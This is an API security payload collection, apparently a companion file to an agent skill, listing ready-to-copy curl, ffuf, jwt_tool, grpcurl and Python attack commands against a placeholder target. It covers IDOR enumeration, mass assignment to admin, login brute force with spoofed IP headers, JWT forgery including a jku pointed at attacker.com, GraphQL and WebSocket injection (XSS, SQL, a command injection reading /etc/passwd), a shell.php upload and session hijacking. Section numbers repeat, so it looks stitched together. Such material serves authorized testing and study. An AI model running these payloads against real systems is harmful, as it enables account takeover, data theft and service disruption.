# API Security Payload Collection

> This file is a companion to `SKILL.md`, organizing common payloads for API security testing by attack type.
> Purpose: Quickly find request construction patterns for specific attack types, ready to copy for testing.
> All payloads are for authorized security testing only.

---

## Index

1. [API Endpoint Discovery](#1-api-endpoint-discovery)
2. [BOLA (IDOR) Testing](#2-bola-idor-testing)
3. [Mass Assignment](#3-mass-assignment)
4. [Rate Limit Bypass](#4-rate-limit-bypass)
5. [JWT Attacks](#5-jwt-attacks)
6. [GraphQL Attacks](#6-graphql-attacks)
7. [Content-Type Abuse](#7-content-type-abuse)
8. [API Key Leakage Detection](#8-api-key-leakage-detection)

---

## 1. API Endpoint Discovery

### Swagger / OpenAPI Document Exposure

```bash
# Common documentation path probing
curl -s -o /dev/null -w "%{http_code}" https://target.com/swagger.json
curl -s -o /dev/null -w "%{http_code}" https://target.com/api-docs
curl -s -o /dev/null -w "%{http_code}" https://target.com/openapi.json
curl -s -o /dev/null -w "%{http_code}" https://target.com/v2/api-docs
curl -s -o /dev/null -w "%{http_code}" https://target.com/swagger-ui/
curl -s -o /dev/null -w "%{http_code}" https://target.com/api/swagger
curl -s -o /dev/null -w "%{http_code}" https://target.com/graphql
```

### kiterunner Route Discovery

```bash
# Spec-based large-scale route enumeration
kr scan https://target.com -w /usr/share/wordlists/kiterunner/routes.kite -x 20

# Only specific status codes
kr scan https://target.com -w routes.kite -x 20 --fail-status-codes 404,400
```

### ffuf API Path Enumeration

```bash
# Path Fuzzing
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -u https://target.com/api/v1/FUZZ \
     -H "Authorization: Bearer TOKEN" \
     -mc 200,201,403,401 -fc 404

# HTTP Method Fuzzing
ffuf -w GET,POST,PUT,PATCH,DELETE,OPTIONS \
     -u https://target.com/api/v1/users/123 \
     -X FUZZ -H "Authorization: Bearer TOKEN" \
     -mc 200,201,204,403

# Version Fuzzing (discover old API versions)
ffuf -w v1,v2,v3,api,rest,graphql,internal,admin,staging \
     -u https://target.com/FUZZ/users \
     -mc 200,401,403
```

---

## 2. BOLA (IDOR) Testing

### Basic IDOR — Integer IDs

```bash
# Access USER_B's resource using USER_A's Token
curl -s -H "Authorization: Bearer USER_A_TOKEN" \
     https://target.com/api/v1/users/123/profile

curl -s -H "Authorization: Bearer USER_A_TOKEN" \
     https://target.com/api/v1/users/456/profile
# Compare both responses — if both return 200 with different content -> BOLA confirmed
```

### ffuf Batch BOLA Detection

```bash
# Integer ID batch detection
seq 1 1000 > ids.txt
ffuf -w ids.txt:FUZZ_ID \
     -u https://target.com/api/v1/users/FUZZ_ID/profile \
     -H "Authorization: Bearer USER_A_TOKEN" \
     -mc 200 -fs $(curl -s -H "Authorization: Bearer USER_A_TOKEN" \
                    https://target.com/api/v1/users/SELF_ID/profile | wc -c)
```

### UUID-based IDOR

```bash
# Collect UUIDs (from other API responses, error messages, logs)
curl -s -H "Authorization: Bearer TOKEN" \
     https://target.com/api/v1/users/me/posts | jq '.[].author_id'

# Test with extracted UUIDs
for uuid in $(cat collected_uuids.txt); do
    resp=$(curl -s -o /dev/null -w "%{http_code}" \
          -H "Authorization: Bearer OTHER_USER_TOKEN" \
          "https://target.com/api/v1/documents/$uuid")
    [ "$resp" = "200" ] && echo "[+] BOLA: $uuid -> $resp"
done
```

### Multi-level BOLA

```bash
# Organization -> Project -> Document three-level BOLA
curl -s -H "Authorization: Bearer USER_A_TOKEN" \
     https://target.com/api/v1/orgs/1/projects/5/docs/42
# Replace IDs layer by layer, testing authorization checks at each level
```

---

## 3. Mass Assignment

### Registration Endpoint Privilege Escalation

```bash
# Normal registration
curl -s -X POST https://target.com/api/v1/register \
     -H "Content-Type: application/json" \
     -d '{"username":"testuser","password":"P@ss1234","email":"test@test.com"}'

# Inject role field
curl -s -X POST https://target.com/api/v1/register \
     -H "Content-Type: application/json" \
     -d '{"username":"testuser2","password":"P@ss1234","email":"test2@test.com","role":"admin"}'
# If response includes "role":"admin" -> Mass Assignment confirmed
```

### Profile Update Injection

```bash
# Normal update
curl -s -X PATCH https://target.com/api/v1/users/123 \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"New Name","bio":"Hello"}'

# Inject read-only properties
curl -s -X PATCH https://target.com/api/v1/users/123 \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"New Name","role":"admin","is_verified":true,"email":"attacker@evil.com"}'
```

### Common Injectable Fields

```json
// The following fields should normally be read-only but may be exploitable via Mass Assignment
{"role": "admin"}
{"is_admin": true}
{"is_verified": true}
{"email_verified_at": "2026-01-01T00:00:00Z"}
{"plan": "premium"}
{"credit": 10000}
{"status": "active"}
{"permissions": ["*"]}
{"group_id": 1}
```

### PUT Full Overwrite

```bash
# PUT requests are more likely to trigger Mass Assignment (replaces entire object)
curl -s -X PUT https://target.com/api/v1/users/123 \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"Test","email":"t@t.com","role":"admin","plan":"enterprise"}'
```

---

## 4. Rate Limit Bypass

### X-Forwarded-For IP Spoofing

```bash
# Change IP with each request
for i in $(seq 1 100); do
    curl -s -o /dev/null -w "%{http_code}" \
         -H "X-Forwarded-For: 10.0.0.$((RANDOM%255))" \
         -H "Authorization: Bearer TOKEN" \
         https://target.com/api/v1/login \
         -d '{"email":"admin@target.com","password":"guess'$i'"}'
done
```

### Multiple Header Stacking

```bash
curl -s -H "X-Forwarded-For: 1.2.3.4" \
     -H "X-Originating-IP: 1.2.3.4" \
     -H "X-Remote-IP: 1.2.3.4" \
     -H "X-Client-IP: 1.2.3.4" \
     -H "X-Real-IP: 1.2.3.4" \
     -H "X-Host: 1.2.3.4" \
     https://target.com/api/v1/sensitive-endpoint
```

### Path Mutation Bypass

```bash
# Add meaningless path segments or parameters
curl -s https://target.com/api/v1/endpoint?param=value&_=$(date +%s)
curl -s https://target.com/api/v1/./endpoint?param=value
curl -s https://target.com/api/v1/endpoint/?param=value
curl -s https://target.com/api/v1/endpoint?param=value#fragment
curl -s https://target.com/api/v1/endpoint?param=value%00
```

### API Version Downgrade

```bash
# v2 has Rate Limit, v1 may not
curl -s https://target.com/api/v1/login -d '{"email":"x","password":"y"}'
curl -s https://target.com/api/v2/login -d '{"email":"x","password":"y"}'
```

---

## 5. JWT Attacks

### alg:none Signature Bypass

```bash
# Modify Header to {"alg":"none","typ":"JWT"}
# Keep original Payload, clear signature

# Using jwt_tool
python3 jwt_tool.py <TOKEN> -X a

# Manual construction
header=$(echo -n '{"alg":"none","typ":"JWT"}' | base64url)
payload=$(echo -n '{"sub":"admin","role":"admin"}' | base64url)
echo "${header}.${payload}."
# Note: signature part is empty
```

### RS256 -> HS256 Algorithm Confusion

```bash
# Use public key as HS256 key for signing
python3 jwt_tool.py <TOKEN> -X k -pk public_key.pem
```

### Payload Tampering

```bash
# Modify user field
python3 jwt_tool.py <TOKEN> -I -pc sub -pv admin

# Modify role field
python3 jwt_tool.py <TOKEN> -I -pc role -pv admin

# Add jku Header injection
python3 jwt_tool.py <TOKEN> -X j -ju "https://attacker.com/jwks.json"
```

### JWT Key Brute Force

```bash
# Hashcat mode 16500 (HS256)
echo "<JWT_TOKEN>" > jwt_hash.txt
hashcat -m 16500 jwt_hash.txt /usr/share/wordlists/rockyou.txt

# Common weak key list
# secret, password, 123456, key, jwt_secret, your-256-bit-secret
```

---

## 6. GraphQL Attacks

### Introspection Query

```bash
# Full Schema extraction
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{__schema{types{name,fields{name,type{name}}}}}"}' | jq .
```

### Deep Nesting DoS

```bash
# Test query depth limits
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{user(id:1){posts{comments{user{posts{comments{user{id}}}}}}}}"}'
```

### Batch Query Brute Force

```bash
# Send multiple queries in a single request (bypass Rate Limit)
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '[{"query":"{user(id:1){email}}"},{"query":"{user(id:2){email}}"},{"query":"{user(id:3){email}}"}]'
```

### Unauthorized Mutation Testing

```bash
# Test if unauthenticated users can execute Mutations
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"mutation{updateUser(id:1,role:\"admin\"){id,role}}"}'
```

### Field Suggestion Discovery

```bash
# Intentionally misspell field name to trigger GraphQL error suggestion
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{user(id:1){emaiil}}"}'
# Response may include: "Did you mean \"email\"?"
```

---

## 7. Content-Type Abuse

### JSON <-> XML Switch

```bash
# Server expects JSON, try sending XML (may trigger XXE)
curl -s -X POST https://target.com/api/v1/users \
     -H "Content-Type: application/xml" \
     -d '<?xml version="1.0"?><user><name>test</name></user>'

# Server expects XML, try sending JSON (may bypass WAF)
curl -s -X POST https://target.com/api/v1/users \
     -H "Content-Type: application/json" \
     -d '{"name":"test"}'
```

### Content-Type Parameter Pollution

```bash
# Try different Content-Types to bypass validation
curl -s -X POST https://target.com/api/v1/upload \
     -H "Content-Type: multipart/form-data" \
     -F "file=@shell.php;type=image/jpeg"

curl -s -X POST https://target.com/api/v1/data \
     -H "Content-Type: application/json; charset=utf-7"
```

---

## 8. API Key Leakage Detection

### JavaScript File Search

```bash
# Download frontend JS files and search for API Keys
curl -s https://target.com/static/js/app.js | grep -oE '(api[_-]?key|token|secret|password)["\s]*[:=]\s*["\x27][^"]{10,}'

# Common API Key prefix patterns
# AWS: AKIA[0-9A-Z]{16}
# Google AI: AIza[0-9A-Za-z_-]{35}
# Stripe: [sr]k_(live|test)_[0-9a-zA-Z]{24}
# GitHub: ghp_[0-9a-zA-Z]{36}
```

### HTTP Header Leakage

```bash
# Check response headers for version/technology information
curl -sI https://target.com/api/v1/ | grep -iE '(server|x-powered-by|x-api-version|x-debug)'
```

### Error Message Leakage

```bash
# Trigger error responses, check for stack/SQL leakage
curl -s https://target.com/api/v1/users/abc          # Invalid ID
curl -s -X POST https://target.com/api/v1/users -d 'invalid'  # Format error
curl -s https://target.com/api/v1/users/999999999    # Out-of-range ID
curl -s -H "Authorization: Bearer invalid" https://target.com/api/v1/users
```

---

## 9. GraphQL Exploitation

### Full Introspection with Field Arguments

```bash
# Complete introspection query extracting types, fields, arguments, and mutations
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { queryType { name } mutationType { name } types { name kind fields { name args { name type { name kind ofType { name } } } type { name kind ofType { name } } } } } }"}' | jq '.data.__schema.types[] | select(.kind == "OBJECT") | {name, fields: [.fields[].name]}'

# Extract all mutations with their arguments
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { mutationType { fields { name args { name type { name kind ofType { name } } } } } } }"}' | jq '.data.__schema.mutationType.fields[]'
```

### GraphQL Batching Attack (Rate Limit Bypass)

```bash
# Batch 100 login attempts in a single HTTP request
python3 -c "
import json
queries = []
for i in range(100):
    queries.append({
        'query': f'mutation {{ login(email: \"admin@target.com\", password: \"pass{i}\") {{ token }} }}',
        'operationName': None
    })
print(json.dumps(queries))
" | curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d @- | jq '.[] | select(.data.login.token != null)'
```

### Nested Query DoS (Resource Exhaustion)

```bash
# Generate deeply nested query to test depth limits
python3 -c "
depth = 20
query = 'query { '
for i in range(depth):
    query += 'users { posts { comments { author { '
query += 'id name email '
query += '} ' * (depth * 4)
query += '}'
print(query)
" | curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d "{\"query\": \"$(cat)\"}" -w "\n%{time_total}s\n"

# Alias-based query multiplication (bypass query cost analysis)
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ a1:user(id:1){email} a2:user(id:2){email} a3:user(id:3){email} a4:user(id:4){email} a5:user(id:5){email} a6:user(id:6){email} a7:user(id:7){email} a8:user(id:8){email} a9:user(id:9){email} a10:user(id:10){email} }"}'
```

### GraphQL Injection via Variables

```bash
# SQL injection through GraphQL variables
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"query getUser($id: String!) { user(id: $id) { name email } }","variables":{"id":"1 OR 1=1--"}}'

# NoSQL injection through variables
curl -s -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"query getUser($filter: JSON) { users(filter: $filter) { name email } }","variables":{"filter":{"$gt":""}}}'
```

### GraphQL Subscription Abuse

```bash
# Test WebSocket-based GraphQL subscriptions for auth bypass
python3 -c "
import websocket
import json

ws = websocket.create_connection('wss://target.com/graphql', subprotocols=['graphql-ws'])
# Init connection without auth
ws.send(json.dumps({'type': 'connection_init', 'payload': {}}))
print(ws.recv())

# Subscribe to sensitive data stream
ws.send(json.dumps({
    'id': '1',
    'type': 'start',
    'payload': {'query': 'subscription { newOrder { id amount customerEmail } }'}
}))
print(ws.recv())
ws.close()
"
```

---

## 10. gRPC Security Testing

### gRPC Service Reflection Enumeration

```bash
# List all available gRPC services via reflection
grpcurl -plaintext target.com:50051 list

# Describe a specific service (get method signatures)
grpcurl -plaintext target.com:50051 describe UserService

# Describe a specific message type
grpcurl -plaintext target.com:50051 describe .user.UserRequest

# List methods of a service
grpcurl -plaintext target.com:50051 list UserService
```

### gRPC Method Invocation Without Auth

```bash
# Call gRPC method without authentication
grpcurl -plaintext -d '{"user_id": "admin"}' \
  target.com:50051 UserService/GetUser

# Call with manipulated metadata (auth bypass attempt)
grpcurl -plaintext \
  -H "authorization: Bearer invalid_token" \
  -H "x-user-role: admin" \
  -d '{"user_id": "1"}' \
  target.com:50051 UserService/GetUser

# Enumerate user IDs via gRPC
for i in $(seq 1 100); do
  result=$(grpcurl -plaintext -d "{\"user_id\": \"$i\"}" \
    target.com:50051 UserService/GetUser 2>&1)
  echo "$result" | grep -q "email" && echo "[+] User $i: $result"
done
```

### gRPC Message Manipulation

```bash
# Send malformed protobuf messages to trigger errors
grpcurl -plaintext -d '{"user_id": "1\x00admin"}' \
  target.com:50051 UserService/GetUser

# Integer overflow in protobuf fields
grpcurl -plaintext -d '{"amount": 9999999999999999999}' \
  target.com:50051 PaymentService/ProcessPayment

# Test field type confusion
grpcurl -plaintext -d '{"user_id": "-1", "role": "ADMIN"}' \
  target.com:50051 UserService/UpdateUser
```

### gRPC-Web Proxy Testing

```bash
# Test gRPC-Web endpoints (HTTP/1.1 compatible)
curl -s -X POST https://target.com/grpc-web/UserService/GetUser \
     -H "Content-Type: application/grpc-web+proto" \
     -H "X-Grpc-Web: 1" \
     --data-binary @request.bin

# Decode gRPC-Web response
curl -s -X POST https://target.com/grpc-web/UserService/ListUsers \
     -H "Content-Type: application/grpc-web-text" \
     -H "X-Grpc-Web: 1" \
     -d "AAAAAAA=" | base64 -d | protoc --decode_raw
```

---

## 11. WebSocket API Attacks

### WebSocket Connection Hijacking

```bash
# Test WebSocket without Origin validation
python3 -c "
import websocket
import json

# Connect with spoofed Origin header
ws = websocket.create_connection(
    'wss://target.com/ws/chat',
    origin='https://evil.com',
    header=['Cookie: session=stolen_session_id']
)
ws.send(json.dumps({'type': 'get_messages', 'channel': 'admin'}))
print(ws.recv())
ws.close()
"
```

### WebSocket Injection Attacks

```bash
# XSS via WebSocket message
python3 -c "
import websocket, json
ws = websocket.create_connection('wss://target.com/ws/chat')
ws.send(json.dumps({
    'type': 'message',
    'content': '<img src=x onerror=alert(document.cookie)>',
    'channel': 'general'
}))
print(ws.recv())

# SQL injection via WebSocket
ws.send(json.dumps({
    'type': 'search',
    'query': \"' OR '1'='1' --\"
}))
print(ws.recv())

# Command injection via WebSocket
ws.send(json.dumps({
    'type': 'ping',
    'host': '127.0.0.1; cat /etc/passwd'
}))
print(ws.recv())
ws.close()
"
```

### WebSocket Authentication Bypass

```bash
# Test if WebSocket upgrades bypass REST API authentication
# Step 1: Establish connection without auth token
python3 -c "
import websocket, json, ssl

ws = websocket.create_connection(
    'wss://target.com/ws/api',
    sslopt={'cert_reqs': ssl.CERT_NONE}
)
# Attempt to access authenticated endpoints via WS
ws.send(json.dumps({'action': 'getUsers', 'params': {}}))
response = json.loads(ws.recv())
if 'users' in response:
    print('[+] WebSocket auth bypass: accessed user data without token')
    print(json.dumps(response, indent=2))
else:
    print('[-] Authentication enforced on WebSocket')
ws.close()
"
```

### WebSocket Rate Limit Testing

```bash
# Flood WebSocket with rapid messages to test rate limiting
python3 -c "
import websocket, json, time

ws = websocket.create_connection('wss://target.com/ws/api')
success = 0
blocked = 0
for i in range(1000):
    try:
        ws.send(json.dumps({'action': 'login', 'user': 'admin', 'pass': f'pass{i}'}))
        resp = ws.recv()
        if 'rate' in resp.lower() or 'limit' in resp.lower():
            blocked += 1
            break
        success += 1
    except Exception as e:
        print(f'Connection closed after {success} attempts: {e}')
        break
print(f'Sent: {success + blocked}, Blocked at: {success}')
ws.close()
"
```

---

## 12. API Versioning Exploits

### Deprecated Endpoint Discovery

```bash
# Enumerate API versions to find deprecated/unpatched endpoints
for version in v1 v2 v3 v4 v5 beta alpha internal legacy; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer TOKEN" \
    "https://target.com/api/$version/users")
  [ "$code" != "404" ] && echo "[+] /$version/users -> HTTP $code"
done

# Check version via Accept header
for version in 1 2 3; do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Accept: application/vnd.api.v${version}+json" \
    -H "Authorization: Bearer TOKEN" \
    "https://target.com/api/users")
  [ "$code" != "404" ] && echo "[+] Accept v${version} -> HTTP $code"
done
```

### Version Rollback Attack

```bash
# v2 has input validation, v1 may not
# Test SQL injection on old version
curl -s "https://target.com/api/v1/users?search=admin' OR '1'='1" \
     -H "Authorization: Bearer TOKEN"

# Test mass assignment on old version (v1 may lack field filtering)
curl -s -X PUT "https://target.com/api/v1/users/123" \
     -H "Authorization: Bearer TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"name":"test","role":"admin","is_superuser":true}'

# Test BOLA on old version (v1 may lack authorization checks)
curl -s "https://target.com/api/v1/admin/users" \
     -H "Authorization: Bearer REGULAR_USER_TOKEN"
```

### API Version Header Manipulation

```bash
# Override API version via custom headers
curl -s "https://target.com/api/users" \
     -H "Authorization: Bearer TOKEN" \
     -H "X-API-Version: 1" \
     -H "Api-Version: 2020-01-01"

# Test version negotiation bypass
curl -s "https://target.com/api/users" \
     -H "Authorization: Bearer TOKEN" \
     -H "Accept: application/json; version=1"

# GraphQL version bypass via persisted queries
curl -s -X POST "https://target.com/graphql" \
     -H "Content-Type: application/json" \
     -d '{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"old_deprecated_query_hash"}}}'
```

### Sunset Header and Deprecation Abuse

```bash
# Find endpoints with Sunset/Deprecation headers (still functional but unmonitored)
for endpoint in users orders payments admin config settings; do
  headers=$(curl -sI "https://target.com/api/v1/$endpoint" \
    -H "Authorization: Bearer TOKEN")
  sunset=$(echo "$headers" | grep -i "sunset\|deprecat")
  if [ -n "$sunset" ]; then
    echo "[DEPRECATED] /api/v1/$endpoint"
    echo "  $sunset"
    # Test if deprecated endpoint has weaker security
    curl -s "https://target.com/api/v1/$endpoint" \
      -H "Authorization: Bearer EXPIRED_TOKEN" -o /dev/null -w "  Status: %{http_code}\n"
  fi
done
```

---

## 9. API Fuzzing with Automated Tools

### REST API Fuzzing with ffuf and Arjun

```bash
# Discover hidden HTTP parameters using Arjun
arjun -u "https://target.com/api/v1/users" -m POST \
  -H "Authorization: Bearer TOKEN" \
  -o arjun_results.json

# Fuzz API parameter values to find edge cases
ffuf -u "https://target.com/api/v1/users/FUZZ" \
  -w <(echo -e "0\n-1\n999999999\nadmin\nroot\nnull\nundefined\nNaN\ntrue\nfalse\n[]\n{}") \
  -H "Authorization: Bearer TOKEN" \
  -mc 200,201,500 -fc 404

# Content-Type manipulation to trigger different parsing
for ctype in "application/json" "application/xml" "application/x-www-form-urlencoded" "text/plain" "multipart/form-data"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com/api/v1/users" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: $ctype" \
    -d '{"name":"test"}')
  echo "[$ctype] -> $STATUS"
done
```

### API Authentication Testing Suite

```bash
# Test token expiration handling
EXPIRED_TOKEN=$(python3 -c "
import jwt, time, base64, json
payload = {'sub':'user','exp':int(time.time())-3600}
header = base64.urlsafe_b64encode(json.dumps({'alg':'HS256','typ':'JWT'}).encode()).rstrip(b'=').decode()
body = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()
print(f'{header}.{body}.fake_sig')
")
curl -s "https://target.com/api/v1/profile" -H "Authorization: Bearer $EXPIRED_TOKEN" -w "\nHTTP: %{http_code}\n"

# Test missing Authorization header
curl -s "https://target.com/api/v1/admin/users" -w "\nHTTP: %{http_code}\n"

# Test null/empty token
curl -s "https://target.com/api/v1/profile" -H "Authorization: Bearer " -w "\nHTTP: %{http_code}\n"
curl -s "https://target.com/api/v1/profile" -H "Authorization: Bearer null" -w "\nHTTP: %{http_code}\n"
```

---

## 10. API Rate Limit Bypass Advanced

### Concurrent Request Rate Limit Bypass

```python
#!/usr/bin/env python3
"""Bypass sliding window rate limits with concurrent burst requests."""
import asyncio
import aiohttp
import time

async def burst_test(url, token, count=50):
    headers = {"Authorization": f"Bearer {token}"}
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(count):
            tasks.append(session.get(url, headers=headers))
        
        start = time.time()
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        elapsed = time.time() - start
        
        success = sum(1 for r in responses if not isinstance(r, Exception) and r.status == 200)
        rate_limited = sum(1 for r in responses if not isinstance(r, Exception) and r.status == 429)
        
        print(f"Sent {count} requests in {elapsed:.2f}s")
        print(f"Success: {success} | Rate limited: {rate_limited} | Other: {count - success - rate_limited}")

asyncio.run(burst_test("https://target.com/api/v1/sensitive-endpoint", "TOKEN", 50))
```

### API Version-based Access Control Testing

```bash
# Test if older API versions have weaker access controls
for version in v1 v2 v3 beta internal staging; do
  for endpoint in users admin/config settings debug; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com/api/$version/$endpoint" \
      -H "Authorization: Bearer LOW_PRIV_TOKEN")
    if [ "$STATUS" != "404" ] && [ "$STATUS" != "401" ]; then
      echo "[+] /api/$version/$endpoint -> $STATUS"
    fi
  done
done
```
